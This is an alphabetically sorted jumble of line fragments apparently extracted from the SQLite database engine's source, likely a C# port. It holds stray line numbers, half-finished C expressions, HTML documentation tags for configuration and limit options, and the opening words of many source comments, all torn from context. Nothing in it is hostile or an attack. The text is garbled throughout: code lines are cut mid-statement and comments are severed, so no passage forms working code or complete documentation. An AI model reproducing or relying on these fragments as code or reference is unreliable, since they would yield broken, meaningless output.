 208 
 209 
 21 bits - BBA
 210 
 21086676
 210866760000000L )
 211 
 212 
 213 
 214 
 215 
 216 
 217 
 218 
 219 
 220 
 221 
 222 
 223 
 224 
 225 
 226 
 227 
 228 
 229 
 23 <= MX_CELL_SIZE(pBt))
 230 
 2305813
 231 
 232 
 233 
 234 
 235 
 236 
 237 
 238 
 239 
 24.0 
 240 
 241 
 242 
 243 
 244 
 245 
 246 
 247 
 248 
 249 
 250 
 251 
 252 
 253 
 254 
 255 
 255 != (u8)z[cnt - 1] )
 255 >= pBt.pageSize)
 255 bytes of overhead.  SQLite itself will never use anything near
 256 
 257 
 258 
 259 
 260 
 261 
 262 
 263 
 264 
 265 
 266 
 267 
 268 
 269 
 270 
 271 
 272 
 273 
 274 
 275 
 276 
 277 
 278 
 279 
 28 bits - BBBA
 28..2f    ()
 280 
 281 
 282 
 283 
 284 
 285 
 286 
 287 
 288 
 289 
 290 
 291 
 292 
 293 
 294 
 295 
 296 
 297 
 298 
 299 
 2:   Operating system is WinNT.
 2:  Other database connections that share the same pager cache
 2: (!start_constraints 
 2: (end_constraints 
 2: A variable arguments function that uses UTF-16BE when UTF-16LE is
 2:save off p0<<21 
 2] 
 2] )
 2] ) )
 2] - 1
 2] << 24 ) 
 2] << 8 ) 
 2] = '
 2] = 0
 2] = pTrunk.aData[0 
 2] == data[hdr 
 2nd and subsequent times through the loop 
 2nd input operand 
 2nd parameter of sqlite3_result_error() or sqlite3_result_error16()
 2nd parameter to sqlite3_bind out of range 
 2s complement of that positive value.  The end result can
 2x 
 2x number of WHEN terms 
 3  CREATE: 
 3 )
 3 ) 
 3 ) == ( enc 
 3 : 2 )
 3 = 98307.
 3 >= pnext 
 3) 
 3))
 3-byte signed integer 
 3-byte type for each of the maximum of 32768 columns plus three
 30..37    01234567 
 30.0 
 300 
 301 
 302 
 303 
 304 
 305 
 306 
 307 
 308 
 309 
 310 
 311 
 312 
 313 
 314 
 315 
 316 
 317 
 318 
 319 
 32 / 255 - 23)
 320 
 321 
 322 
 323 
 324 
 325 
 326 
 327 
 328 
 35 bits - BBBBA
 3600
 3600.0 
 3600000 
 365.0 
 38..3f    89:
 3:  The database must be writable (not on read-only media)
 3: (!start_constraints 
 3: A variable arguments function using the same text encoding.
 3: Open cursor 0 for reading 
 3] )
 3] << 16 ) 
 3] = '
 3] = (byte)(pPage.nCell >> 8)
 3] = pTrunk.aData[0 
 3rd 
 3rd input operand 
 3rd parameter to the [sqlite3_open_v2()] interface and
 3x 
 4 )
 4 ) ) )
 4 : 0)
 4 < nTemp )
 4 TRIGGER: 
 4 bytes: Master journal name checksum.
 4 bytes: PAGER_MJ_PGNO.
 4 if pPage is a leaf.  0 if not 
 4) 
 4) != 0
 4) != 0)
 4) - nearby)
 4-byte signed integer 
 4-byte unsigned integer 
 40..47    @ABCDEFG 
 42 bits - BBBBBA
 43200 ) / 86400 
 43200000 ) % 86400000 )
 43200000 ) / 86400000 )
 43200000 ) / 86400000 ) % 7 )
 4716 ) / 100 )
 48-bits as required by the IEEE standard.  (This is the
 48..4f    HIJKLMNO 
 49 bits - BBBBBBA
 4:  There must be an active transaction.
 4: (start_constraints  
 4: A function with the exact number of arguments requested that
 4: Open cursor 0 for read/write 
 4] << 24 ) 
 4] << 8 ) 
 4] = (byte)(pPage.nCell)
 4th 
 4x 
 5    SEMI: 
 5 column table 
 5) 
 5) <= pBt.usableSize)
 5) == nUsable)
 5))
 50 )
 50..57    PQRSTUVW 
 56 bits - BBBBBBBA
 58..5f    XYZ[
 5: (start_constraints  
 5: A function with the exact number of arguments requested that
 5: Push the rowid to the stack 
 5] 
 5] )
 5] << 16 ) 
 5x 
 6     END: 
 6-byte signed integer 
 60 )
 60..67    
 60.0 
 60.0 ) ) 
 6000 lines long) it was split up into several smaller files and
 60000
 60000 
 64 / 255 - 23)
 64 bits - BBBBBBBBC
 64-bit integer.
 64-bit offset.  64 bits needed to catch overflow 
 68..6f    hijklmno 
 6: (start_constraints  
 6: An exact match.
 6: Seek the cursor 
 6] << 8 ) 
 6])
 6x 
 7  
 7 ) 
 7 ) )
 7 ) ) 
 7 ) ) ) != 0 
 7 ) / 8 
 7 - wd ) / 7 )
 7) == 0)
 7)==0 )
 70..77    pqrstuvw 
 78..7f    xyz{
 7: (start_constraints  
 7] 
 7] )
 7] -= (u8)frag
 7] = (u8)(nFrag 
 7] = 0
 7])
 7]))
 7x 
 8  
 8 )
 8 ) 
 8 ) )
 8 ) ) )
 8 - 1 ) )
 8 > pVfs.mxPathname )
 8 bits and is the last byte.
 8 bytes: aJournalMagic[].
 8) != iFrom)
 8) == iChild)
 8))
 8-byte alignment of pageSize 
 8-byte boundary. The page to be fetched is determined by the key. The
 8-byte signed integer 
 8-byte unsigned integer 
 80..87    ........ 
 86400000
 86400000 )
 86400000.0 
 88..8f    ........ 
 8] = (byte)v
 8x 
 9  
 9 )
 9 / 10 )
 90..97    ........ 
 98..9f    ........ 
 999 ) / 1000 )
 999 ) / 1000 ) 
 9x 
 < 5
 < MX_DELETION_ATTEMPTS )
 < MX_DELETION_ATTEMPTS)
 < WINCE_DELETION_ATTEMPTS
 </blockquote>
 </dd>
 </dl>
 </li>
 </ol>
 </pre>
 </pre> {END}
 </pre></blockquote>
 </table>
 </ul>
 </ul> {END}
 <b>Callback Invocation Details</b>
 <b>Concurrent Usage of Database Handles</b>
 <b>Deadlock Detection</b>
 <b>Note to Windows users:</b>  The encoding used for the filename argument
 <b>sqlite3_backup_finish()</b>
 <b>sqlite3_backup_init()</b>
 <b>sqlite3_backup_step()</b>
 <blockquote>
 <blockquote><pre>
 <dd>The database is opened in read-only mode.  If the database does not
 <dd>The maximum depth of the parse tree on any expression.</dd>
 <dd>The maximum length of an SQL statement.</dd>
 <dd>The maximum length of the pattern argument to the [LIKE] or
 <dd>The maximum number of [ATTACH 
 <dd>The maximum number of arguments on a function.</dd>
 <dd>The maximum number of columns in a table definition or in the
 <dd>The maximum number of instructions in a virtual machine program
 <dd>The maximum number of terms in a compound SELECT statement.</dd>
 <dd>The maximum number of variables in an SQL statement that can
 <dd>The maximum size of any string or BLOB or table row.<dd>
 <dd>There are no arguments to this option.  This option disables
 <dd>There are no arguments to this option.  This option enables
 <dd>This is the number of sort operations that have occurred.
 <dd>This is the number of times that SQLite has stepped forward in
 <dd>This option specifies a static memory buffer that SQLite can use for
 <dd>This option specifies a static memory buffer that SQLite will use
 <dd>This option takes a single argument which is a pointer to
 <dd>This option takes a single argument which is a pointer to an
 <dd>This option takes three additional arguments that determine the 
 <dd>This option takes two arguments that determine the default
 <dd>This parameter is the current amount of memory checked out
 <dd>This parameter records the deepest parser stack.  It is only
 <dd>This parameter records the largest memory allocation request
 <dd>This parameter returns the number of allocations used out of the
 <dd>This parameter returns the number of bytes of page cache
 <dd>This parameter returns the number of bytes of scratch memory
 <dd>This parameter returns the number of lookaside memory slots currently
 <dd>This parameter returns the number of pages used out of the
 <dl>
 <dt>SQLITE_CONFIG_GETMALLOC</dt>
 <dt>SQLITE_CONFIG_GETMUTEX</dt>
 <dt>SQLITE_CONFIG_GETPCACHE</dt>
 <dt>SQLITE_CONFIG_HEAP</dt>
 <dt>SQLITE_CONFIG_LOOKASIDE</dt>
 <dt>SQLITE_CONFIG_MALLOC</dt>
 <dt>SQLITE_CONFIG_MEMSTATUS</dt>
 <dt>SQLITE_CONFIG_MULTITHREAD</dt>
 <dt>SQLITE_CONFIG_MUTEX</dt>
 <dt>SQLITE_CONFIG_PAGECACHE</dt>
 <dt>SQLITE_CONFIG_PCACHE</dt>
 <dt>SQLITE_CONFIG_SCRATCH</dt>
 <dt>SQLITE_CONFIG_SERIALIZED</dt>
 <dt>SQLITE_CONFIG_SINGLETHREAD</dt>
 <dt>SQLITE_DBCONFIG_LOOKASIDE</dt>
 <dt>SQLITE_DBSTATUS_LOOKASIDE_USED</dt>
 <dt>SQLITE_LIMIT_ATTACHED</dt>
 <dt>SQLITE_LIMIT_COLUMN</dt>
 <dt>SQLITE_LIMIT_COMPOUND_SELECT</dt>
 <dt>SQLITE_LIMIT_EXPR_DEPTH</dt>
 <dt>SQLITE_LIMIT_FUNCTION_ARG</dt>
 <dt>SQLITE_LIMIT_LENGTH</dt>
 <dt>SQLITE_LIMIT_LIKE_PATTERN_LENGTH</dt>
 <dt>SQLITE_LIMIT_SQL_LENGTH</dt>
 <dt>SQLITE_LIMIT_VARIABLE_NUMBER</dt>
 <dt>SQLITE_LIMIT_VDBE_OP</dt>
 <dt>SQLITE_STATUS_MALLOC_SIZE</dt>
 <dt>SQLITE_STATUS_MEMORY_USED</dt>
 <dt>SQLITE_STATUS_PAGECACHE_OVERFLOW</dt>
 <dt>SQLITE_STATUS_PAGECACHE_SIZE</dt>
 <dt>SQLITE_STATUS_PAGECACHE_USED</dt>
 <dt>SQLITE_STATUS_PARSER_STACK</dt>
 <dt>SQLITE_STATUS_SCRATCH_OVERFLOW</dt>
 <dt>SQLITE_STATUS_SCRATCH_SIZE</dt>
 <dt>SQLITE_STATUS_SCRATCH_USED</dt>
 <dt>SQLITE_STMTSTATUS_FULLSCAN_STEP</dt>
 <dt>SQLITE_STMTSTATUS_SORT</dt>
 <dt>[SQLITE_OPEN_READONLY]</dt>
 <dt>[SQLITE_OPEN_READWRITE] 
 <dt>[SQLITE_OPEN_READWRITE]</dt>
 <i>NNN</i> bytes in size and uses that array for all of its dynamic
 <li>
 <li>  
 <li>   SQLITE_MUTEX_NOOP
 <li>   SQLITE_MUTEX_OS2
 <li>   SQLITE_MUTEX_PTHREAD
 <li>   SQLITE_MUTEX_W32
 <li>  $VVV
 <li>  :VVV
 <li>  @VVV
 <li>  A pointer to a function used to reclaim memory obtained
 <li>  A pointer to the parser.  This should be a pointer
 <li>  SQLITE_MUTEX_FAST
 <li>  SQLITE_MUTEX_FAST               0
 <li>  SQLITE_MUTEX_RECURSIVE
 <li>  SQLITE_MUTEX_RECURSIVE          1
 <li>  SQLITE_MUTEX_STATIC_LRU
 <li>  SQLITE_MUTEX_STATIC_LRU2
 <li>  SQLITE_MUTEX_STATIC_MASTER
 <li>  SQLITE_MUTEX_STATIC_MASTER      2
 <li>  SQLITE_MUTEX_STATIC_MEM
 <li>  SQLITE_MUTEX_STATIC_MEM         3
 <li>  SQLITE_MUTEX_STATIC_MEM2
 <li>  SQLITE_MUTEX_STATIC_PRNG
 <li>  SQLITE_MUTEX_STATIC_PRNG        4
 <li>  [SQLITE_OPEN_MAIN_DB]
 <li>  [SQLITE_OPEN_MAIN_JOURNAL]
 <li>  [SQLITE_OPEN_MASTER_JOURNAL]
 <li>  [SQLITE_OPEN_SUBJOURNAL]
 <li>  [SQLITE_OPEN_TEMP_DB]
 <li>  [SQLITE_OPEN_TEMP_JOURNAL]
 <li>  [SQLITE_OPEN_TRANSIENT_DB]
 <li> 64-bit IEEE floating point number
 <li> 64-bit signed integer
 <li> A FILE
 <li> A pointer to the parser (an opaque structure.)
 <li> A prefix string written at the beginning of every
 <li> An option argument of a grammar-specified type.
 <li> BLOB
 <li> Bind values to [host parameters] using the sqlite3_bind_
 <li> Create the object using [sqlite3_prepare_v2()] or a related
 <li> Destroy the object using [sqlite3_finalize()].
 <li> NULL
 <li> Reset the statement using [sqlite3_reset()] then go back
 <li> Run the SQL by calling [sqlite3_step()] one or more times.
 <li> The initial content is UTF-16 text and sqlite3_column_bytes() or
 <li> The initial content is UTF-8 text and sqlite3_column_bytes16() or
 <li> The initial content is a BLOB and sqlite3_column_text() or
 <li> The major token number.
 <li> The minor token number.
 <li> [SQLITE_IOCAP_ATOMIC16K]
 <li> [SQLITE_IOCAP_ATOMIC1K]
 <li> [SQLITE_IOCAP_ATOMIC2K]
 <li> [SQLITE_IOCAP_ATOMIC32K]
 <li> [SQLITE_IOCAP_ATOMIC4K]
 <li> [SQLITE_IOCAP_ATOMIC512]
 <li> [SQLITE_IOCAP_ATOMIC64K]
 <li> [SQLITE_IOCAP_ATOMIC8K]
 <li> [SQLITE_IOCAP_ATOMIC]
 <li> [SQLITE_IOCAP_SAFE_APPEND]
 <li> [SQLITE_IOCAP_SEQUENTIAL]
 <li> [SQLITE_LOCK_EXCLUSIVE].
 <li> [SQLITE_OPEN_DELETEONCLOSE]
 <li> [SQLITE_OPEN_EXCLUSIVE]
 <li> string
 <ol>
 <operator> is used:
 <pre>
 <pre>column OP expr</pre>
 <table border=1 width=85% align=center>
 <td> Data type
 <td> Name of default collation sequence
 <todo> Check on this </todo>
 <tr><td>  BLOB    <td>   TEXT    <td> Add a zero terminator if needed
 <tr><td>  BLOB    <td>  FLOAT    <td> Convert to TEXT then use atof()
 <tr><td>  BLOB    <td> INTEGER   <td> Convert to TEXT then use atoi()
 <tr><td>  FLOAT   <td>   BLOB    <td> Same as FLOAT->TEXT
 <tr><td>  FLOAT   <td>   TEXT    <td> ASCII rendering of the float
 <tr><td>  FLOAT   <td> INTEGER   <td> Convert from float to integer
 <tr><td>  NULL    <td>   BLOB    <td> Result is NULL pointer
 <tr><td>  NULL    <td>   TEXT    <td> Result is NULL pointer
 <tr><td>  NULL    <td>  FLOAT    <td> Result is 0.0
 <tr><td>  NULL    <td> INTEGER   <td> Result is 0
 <tr><td>  TEXT    <td>   BLOB    <td> No change
 <tr><td>  TEXT    <td>  FLOAT    <td> Use atof()
 <tr><td>  TEXT    <td> INTEGER   <td> Use atoi()
 <tr><td> 5th <td> const char
 <tr><td> 6th <td> const char
 <tr><td> 7th <td> int         <td> True if column has a NOT NULL constraint
 <tr><td> 8th <td> int         <td> True if column is part of the PRIMARY KEY
 <tr><td> 9th <td> int         <td> True if column is [AUTOINCREMENT]
 <tr><td> INTEGER  <td>   BLOB    <td> Same as INTEGER->TEXT
 <tr><td> INTEGER  <td>   TEXT    <td> ASCII rendering of the integer
 <tr><td> INTEGER  <td>  FLOAT    <td> Convert from integer to float
 <tr><th> Internal<br>Type <th> Requested<br>Type <th>  Conversion
 <tr><th> Parameter <th> Output<br>Type <th>  Description
 <ul>
 = '.'
 = (u8)(((c>>10)
 = (u8)((c>>8)
 = (u8)(0x00D8 
 = (u8)(0x00DC 
 = (u8)(c
 = 0
 = 0x80 
 = 0xC0 
 = 0xE0 
 = 0xF0 
 = temp
 = z
 >= 16 ) return '
 A - ( A / 4 )
 A 32-bit varint is used to store size information in btrees.
 A = B
 A Btree handle
 A JournalFile object is a subclass of sqlite3_file used by
 A MEM_Null value will never be passed to this function. This function is
 A NULL profile function means that no profiling is executes.  A non-NULL
 A NULL trace function means that no tracing is executes.  A non-NULL
 A NULL value is not changed by this routine.  It remains NULL.
 A NameContext defines a context in which to resolve table and column
 A Note About Memory Allocation:
 A PENDING_LOCK is obtained by locking a designated byte different from
 A RowSet in an instance of the following structure.
 A SELECT statement that supplies values 
 A SELECT statement that will become the new view 
 A SELECT statement to use as the data source 
 A SELECT statement used in place of a table name 
 A SHARED_LOCK is obtained by locking a single randomly-chosen
 A Set structure is used for quick testing to see if a value
 A Sub-term within the pOrWc 
 A VACUUM cannot change the pagesize of an encrypted database. 
 A VDBE address 
 A VdbeFunc is just a FuncDef (defined in sqliteInt.h) that contains
 A WHERE clause term 
 A WO_xx value describing <op> 
 A WhereCost object records a lookup strategy and the estimated
 A WhereOrTerm object is computed and attached to the term under
 A WherePlan object holds information that describes a lookup
 A WhereTerm might also be two or more subterms connected by OR:
 A WhereTerm with eOperator==WO_AND has its u.pAndInfo pointer set to
 A WhereTerm with eOperator==WO_OR has its u.pOrInfo pointer set to
 A [SQLITE_FCNTL_LOCKSTATE 
 A [protected sqlite3_value] object may always be used where an
 A base allocation.  Not from malloc. 
 A bitmap is an instance of the following structure.
 A bitmap is used to record which pages of a database file have been
 A btree will work fine with zero or negative rowids.  We just cannot
 A buffer to hold the data for the new record 
 A buffer to hold the magic header 
 A bunch of Debug.Assert() statements to check the transaction state variables
 A busy handler must not close the database connection
 A call to either function replaces any existing callback.
 A call to sqlite3BtreeMoveto() is needed 
 A call to sqlite3_interrupt(D) that occurs when there are no running
 A call to this routine stores N bytes of randomness into buffer P.
 A call to this routine tells the pager that it is not necessary to
 A collating sequence 
 A column in the result set.  0..pEList.nExpr-1 
 A complete hash table is an instance of the following structure.
 A complete page cache is an instance of this structure.
 A complex statement machine used to detect the end of a CREATE TRIGGER
 A connection with the read-uncommitted flag set will never try to
 A consecutive range of registers starting at regRowid contains the
 A convenience macro that returns the number of elements in
 A copy is made of the KeyInfo structure into memory obtained from
 A copy of pPage.pBt 
 A count of rows changed 
 A couple addresses of generated code 
 A cursor is a pointer into a single BTree within a database file.
 A cursor is a pointer to a particular entry within a particular
 A database connection contains a pointer to an instance of
 A fake table from which we get the result set 
 A faster alternative is to write 0xFFFFFFFF to the nRec field. When
 A flag to indicate when processing is finished 
 A full outer join is the combination of JT_LEFT and JT_RIGHT.
 A function that loads a shared-library extension then returns NULL.
 A function where the encoding difference is between UTF16le and UTF16be
 A general purpose loop counter 
 A global function must exist in order for name resolution to work
 A hash on key 
 A hash table for function definitions.
 A hint that reuse is unlikely 
 A jump is made to P2 if the result set after filtering would be empty.
 A jump to addrRepeat is made and the N
 A linked list of the following structures is stored at BtShared.pLock.
 A list of BtShared objects that are eligible for participation
 A list of all open cursors 
 A list of all tables to be scanned 
 A list of columns to be indexed 
 A list of expressions.  Each expression may optionally have a
 A lone identifier is the name of a column.
 A macro to discover the encoding of a database.
 A macro used for invoking the codec if there is one
 A malformed database page might cause us to read past the end
 A malloc may have failed inside of the xFunc() call. If this
 A malloc must have failed 
 A malloc() failed 
 A malloc() may have failed within the call to sqlite3_value_text16()
 A master journal file may only be deleted once all of its child
 A memory allocation error causes p.rc to be set to SQLITE_NOMEM and this
 A memory allocation error has occurred 
 A memory allocation of a number of bytes which is near the maximum
 A missing specifier is not considered an error.
 A modifier of the form (
 A named index with an explicit CREATE INDEX statement 
 A negative nCol is a special marker meaning that we are currently
 A negative or zero value for N means that there is no soft heap limit and
 A negative value for the zeroblob results in a zero-length BLOB.
 A new child page is allocated and the contents of the current root
 A new lower limit does not shrink existing constructs.
 A new savepoint cannot be created if there are active write
 A non-zero value in this counter may indicate an opportunity to
 A open page cache is an instance of the following structure.
 A page needs to be written into the sub-journal if there exists one
 A parameter used by the eDest disposal method 
 A parse of the cell we are pointing at 
 A permanent table name clashes with temp table name 
 A persistent error indicates that the contents of the pager-cache
 A place to hold %extra_argument 
 A pointer to a parser.  This pointer is used in subsequent calls
 A pointer to an instance of this object is the argument to
 A pointer to the function used to allocate memory.
 A pointer to the user supplied routine must be passed as the fifth
 A pointer to this structure is passed into extensions when they are
 A pointer to this structure is used to communicate information
 A positive nCol means the columns names for this view are
 A prefix match is considered OK 
 A pseudo-table created by this opcode is useful for holding the
 A range of registers to hold previous output 
 A read or a write lock can be taken depending on isWritelock.
 A read or write transaction may or may not be active on database handle
 A read-only or read-write transaction must be opened before calling
 A real table 
 A record is an object that contains one or more fields of data.
 A regular table 
 A result set 
 A result table is an array of pointers to zero-terminated UTF-8 strings.
 A result table might consist of one or more memory allocations.
 A result table should be deallocated using [sqlite3_free_table()].
 A return of [SQLITE_BUSY] or [SQLITE_LOCKED] from sqlite3_backup_step() is
 A semicolon 
 A separate function sqlite3LocateCollSeq() is a wrapper around
 A set is just a hash table 
 A simple compiler pragma or casting sequence could not be found
 A single byte is required for the output string
 A single constraint term 
 A single database 
 A single database file can be in use as the same time by two
 A single entry from pTabList 
 A single instruction of the virtual machine has an opcode
 A single level in the pWInfo list 
 A single subterm might be a set of AND-connected sub-subterms.
 A single term of the WHERE clause 
 A slot for the record has already been allocated in the
 A slot for the record has already been allocated in the 
 A smaller version of VdbeOp used for the VdbeAddOpList() function because
 A sort order can be either ASC or DESC.
 A sorting index used to test for distinctness 
 A special flag must be passed to sqlite3WhereBegin() to slightly
 A statement sub-transaction is implemented as an anonymous savepoint. The
 A structure defining how to do GLOB-style comparisons.
 A structure for holding a single date and time.
 A structure used to customize the behavior of sqlite3Select(). See
 A sub-query in the FROM clause of a SELECT 
 A subquery used in place of a table name 
 A subsequent iteration of the do-loop will deal with this by
 A subterm is also indexable if it is an AND of two or more
 A successful evaluation of this routine acquires the mutex on p.
 A syntax error has occurred.
 A table being constructed by CREATE TABLE 
 A table can have at most one primary key.  If the table already has
 A table in the database 
 A table in the database is locked 
 A table is not writable under the following circumstances:
 A table name and column name:     ID.ID
 A temp table must be used if the table being updated is also one
 A temp-file is always in PAGER_EXCLUSIVE or PAGER_SYNCED state. 
 A term of the ORDER BY clause 
 A transaction must be active when this routine is called. It used to be
 A transaction must be started before executing this opcode.
 A transient duplicate expression 
 A trigger is either a BEFORE or an AFTER trigger.  The following constants
 A typedef of this structure if found in sqliteInt.h.
 A value for VdbeCursor.cacheValid that means the cache is always invalid.
 A value of 0 used to mean that the limit was not enforced.
 A value of n==0 means copy bytes of zP4 up to and including the
 A value was pulled from the index 
 A variable-length integer consists of the lower 7 bits of each byte
 A version of printf() that understands %lld.  Used for debugging.
 A view 
 A virtual database can be either a disk file (that is automatically
 A virtual filesystem (VFS) is an [sqlite3_vfs] object
 A virtual table module is created by filling in a persistent
 A write-transaction must be opened before calling this function.
 A write-transaction must be started before attempting any
 A-vs-B comparision jump 
 A=B
 ABI get the byte order right.
 ABORT 
 ADD 
 AFTER 
 ALL 
 ALLOCATION NOTES:
 ALTER 
 ALTER TABLE command. The first argument is the text of a CREATE TABLE or
 ALTER TABLE command. The first argument is the text of a CREATE TRIGGER
 ALTER TABLE logic from the build.
 ALWAYS( ( pTerm.wtFlags 
 ALWAYS( db.nDb > 1 )
 ALWAYS( db.pErr != null ) )
 ALWAYS( elem ) )
 ALWAYS( i < 9 ) )
 ALWAYS( i < db.nDb ) 
 ALWAYS( iDb == 1 ) )
 ALWAYS( j < pTabList.nSrc ) 
 ALWAYS( null == p.pLimit 
 ALWAYS( p.nSrc > 0 ) )
 ALWAYS( pColExpr.pTab != null ) )
 ALWAYS( pListItem.pExpr.pColl ) )
 ALWAYS( pParse.nErr == 0 ) /
 ALWAYS( pVm.db != null ) )
 ALWAYS( rc != SQLITE_LOCKED ) )
 ALWAYS( rc == SQLITE_OK ) )
 ALWAYS( rc == sqlite3_errcode( db ) ) 
 ALWAYS( v.isPrepareV2 ) 
 ALWAYS(i <N_SORT_BUCKET - 1) 
 ALWAYS(p->pNext) ) p = p->pNext
 ALWAYS(pPager.dbSize > 0 ))
 ALWAYS(pPager.journalMode != PAGER_JOURNALMODE_OFF)
 ALWAYS(pPager.journalOff > 0 ))
 ALWAYS(pParse->pNewTable) ){
 ALWAYS(yygotominor.yy14.a)) yygotominor.yy14.a[0].sortOrder = (u8)yymsp[0].minor.yy328
 ANALYZE 
 AND 
 AND-ed combination of all pWC.a[].wtFlags 
 API as long as we don't call it when running Win95/98/ME.  A call to
 API as long as we don't call it win running Win95/98/ME.  A call to
 API call
 API function. The value returned is a copy of the second argument
 API functions and the related features.
 API method and its associated functionality.
 API uses microseconds. Hence the 1000's.
 API.  The only thing omitted is the automatic recompile if a
 API.  This facility is an optional feature of the library.  Embedded
 APIs are not strictly speaking threadsafe. If they are invoked at the
 ARRAY_INCR)
 AS 
 ASC 
 ASC or DESC.  (Terms of the ORDER BY clause past the end of a UNIQUE
 ATTACH 
 AUTOINCREMENT 
 AUTOINCREMENT feature.
 Abandon the tree walk 
 Able to support an IN operator 
 Abort due to constraint violation 
 Abort the SQL statement with an error 
 About the 
 Above is constant between recursions.  Below is reset before and after
 Access authorization function 
 Access permission denied 
 Access to all fields of this structure is controlled by the mutex
 Access to this variable is protected by SQLITE_MUTEX_STATIC_MASTER.
 Accumulate results here 
 Accumulate the error message text here 
 Acquire a PENDING lock
 Acquire a RESERVED lock
 Acquire a lock on the handle h
 Acquire a page if it is already in the in-memory cache.  Do
 Acquire a reader lock.
 Acquire a reference to page number pgno in pager pPager (a page
 Acquire a shared lock
 Acquire an EXCLUSIVE lock
 Acquire the mutex 
 Acquire the mutex before continuing 
 Actual register containing rowids 
 Add 1 to the reference count for page iPage.  If this is the second
 Add MEM_Str to the set of representations for the given Mem.  Numbers
 Add N to the value of a status record.  It is assumed that the
 Add a WO_MATCH auxiliary term to the constraint set if the
 Add a list of cells to a page.  The page should be initially empty.
 Add a lock on the table with root-page iTable to the shared-btree used
 Add a new Btree pointer to a BtreeMutexArray.
 Add a new CHECK constraint to the table currently under construction.
 Add a new column to the table currently being constructed.
 Add a new element to the end of an expression list.  If pList is
 Add a new element to the pAggInfo.aCol[] array.  Return the index of
 Add a new element to the pAggInfo.aFunc[] array.  Return the index of
 Add a new instruction to the list of instructions current in the
 Add a new module argument to pTable->azModuleArg[].
 Add a single new WhereTerm entry to the WhereClause object pWC.
 Add a term to the WHERE expression in ppExpr that requires the
 Add a whole list of operations to the operation stack.  Return the
 Add an INDEXED BY or NOT INDEXED clause to the most recently added
 Add an entry in sqlite_master for this index
 Add an error message to pParse.zErrMsg and increment pParse.nErr.
 Add an opcode that includes the p4 value as a pointer.
 Add code that will check to make sure the N registers starting at iMem
 Add code to implement the OFFSET
 Add connection db to the blocked connections list. It is assumed
 Add constraints to reduce the search space on a LIKE or GLOB
 Add one to the old schema cookie 
 Add pVtab to the end of sqlite3.aVTrans 
 Add page pPage to the head of the dirty list (PCache1.pDirty is set to
 Add sign 
 Add the ability to override 'extern'
 Add the additional cost of sorting if that is a factor.
 Add the constant P2 to the value in register P1.
 Add the default collation sequence BINARY. BINARY works for both UTF-8
 Add the equality term to this expression 
 Add the expression list to the name-context before parsing the
 Add the initial header varint and total the size 
 Add the new BtShared object to the linked list sharable BtShareds.
 Add the new records to the indices as we go.
 Add the opcode to this VM 
 Add the space back into the linked list of freeblocks.  Note that
 Add the table to the in-memory representation of the database.
 Add the text in register P1 onto the end of the text in
 Add the value in register P1 to the value in register P2
 Add the virtual table pVTab to the array sqlite3.aVTrans[].
 Add this many bytes to each in-memory page 
 Add type and collation information to a column list based on
 Added 
 Added after 3.3.13
 Added by 3.3.13 
 Added by 3.4.1 
 Added by 3.5.0 
 Added by the optimizer.  Do not code 
 Added for 3.4.1
 Added for 3.5.0
 Added for 3.5.8
 Added for 3.6.0
 Additional arguments depend on the verb.
 Additional bit values that can be ORed with an affinity without
 Additional columns are used only as parameters to
 Additional information Debug.Associated with pTerm 
 Additional information is available at [limits 
 Additional methods may be added in future releases 
 Additional options will likely appear in future releases of SQLite.
 Address of OP_Goto to cookie verifier subroutine 
 Address of OP_OpenEphemeral instruction 
 Address of a freeblock within pPage.aData[] 
 Address of a i-th cell 
 Address of after trigger program 
 Address of an OP_OpenEphemeral instruction 
 Address of before trigger program 
 Address of coroutine that implements the SELECT 
 Address of first cell pointer in data[] 
 Address of jump to M 
 Address of next cell body 
 Address of next cell pointer 
 Address of regReturn init 
 Address of test for empty pDest 
 Address of test for empty pSrc 
 Address of the A<B subroutine 
 Address of the A==B subroutine 
 Address of the A>B subroutine 
 Address of the end of the query 
 Address of the output-A subroutine 
 Address of the output-B subroutine 
 Address of the select-A coroutine 
 Address of the select-A-exhausted subroutine 
 Address of the select-B coroutine 
 Address of the select-B-exhausted subroutine 
 Address of top of loop 
 Address register for select-A coroutine 
 Address register for select-B coroutine 
 Address register for the output-A subroutine 
 Address register for the output-B subroutine 
 Addresses of jump instructions 
 Addresss of jump instruction 
 Adjust the robustness of the database to damage due to OS crashes
 Advance Pager.journalOff to the start of the next sector. If the
 Advance cursor P1 so that it points to the next key/data pair in its
 Advance the cursor to the next entry in the database.  If
 Advance to the next name context.  The loop will exit when either
 Advance to the next term of the compound
 Advance virtual table P1 to the next row in its result set and
 Affinity
 Affinity must be the same on all columns 
 Affinity to use 
 Affinity used when eDest==SRT_Set 
 After a [prepared statement] has been prepared using either
 After reading the first page of the database assuming a page size
 After this routine runs
 Age
 AggInfo.aCol[] or AggInfo.aFunc[] of information needed to generate
 AggInfo.pGroupBy and AggInfo.aFunc.pExpr point to fields within the
 Aggregate and non-aggregate queries are handled differently 
 Aggregate finalizer 
 Aggregate function with DISTINCT keyword 
 Aggregate functions allowed here 
 Aggregate step 
 Alias for first table.  May be NULL 
 Alias for second table.  May be NULL 
 Aliases are numbered starting with 1.  So iAlias is in the range
 All (named) indices indexed by name 
 All SELECT statements should have been expanded using
 All SQL text past the last semicolon parsed 
 All VTable objects that correspond to a single table in a shared
 All WhereTerms are collected into a single WhereClause structure.
 All all of the FuncDef structures in the aBuiltinFunc[] array above
 All backends 
 All bits are clear when the bitmap is created.  Individual bits
 All cells begin balanced 
 All code in this file should access the global structure above via the
 All collating sequences 
 All column names will be unique.
 All current savepoints are stored in a linked list starting at
 All cursors using the same cache must be tripped
 All elements of the hash table are on a single doubly-linked list.
 All examples A through E above all satisfy case 2.  But if a term
 All fields in this structure are accessed under sqlite3.mutex.
 All information about this Parse 
 All of the code in this file may be omitted by defining a single
 All of the expression analysis must occur on both the outer query and
 All of the integer values are big-endian (most significant byte first).
 All of the keys on the page that Ptr(0) points to have values less
 All of the triggers on pTab that are in the same database as pTab
 All other calls to sqlite3_shutdown() are harmless no-ops.
 All other code has file scope.
 All other information in the i-th WhereLevel object for the i-th table
 All other windows platforms expect GetProcAddress() to take
 All pages of the b-tree have been visited. Return successfully. 
 All resources associated with the specified cache should be freed. After
 All table that pExpr might refer to 
 All tables in the FROM clause 
 All tables indexed by name 
 All terms of the ORDER BY clause are covered by this index so
 All terms of the ORDER BY that match against the index must be either
 All terms of this index match some prefix of the ORDER BY clause
 All the pIdxInfo pointers are freed by whereInfoFree() in where.c.
 All the rest have the FLAG_INTERN bit set and are thus for internal
 All the rest need to always be zero 
 All threads share a single random number generator.
 All three do the same thing.  They return the first non-NULL
 All triggers indexed by name 
 All values are stored on disk as big-endian.
